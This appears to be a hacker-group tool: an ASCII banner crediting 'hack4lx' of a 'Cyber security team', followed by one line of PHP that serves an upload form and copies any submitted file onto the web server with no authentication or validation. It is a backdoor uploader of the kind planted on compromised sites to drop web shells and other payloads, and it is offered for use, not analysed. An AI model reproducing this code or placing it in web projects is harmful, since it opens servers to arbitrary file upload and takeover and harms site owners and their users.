
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::     💻 （︶︿︶）Hacking security team（︶︿︶）    ::
::                 ➖➖➖➖➖➖                    ::
::        💢™M4nifest0 Cyber security team™💢        ::
::                 ➖➖➖➖➖➖                    ::
::              hack4lx Uploader HEX                  ::
::    💢™M4nifest0 Cyber security team™💢            ::
::              Coded by : hack4lx                    ::
::                     2018                           ::
::                                                    ::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::


<?php echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>'; }}?>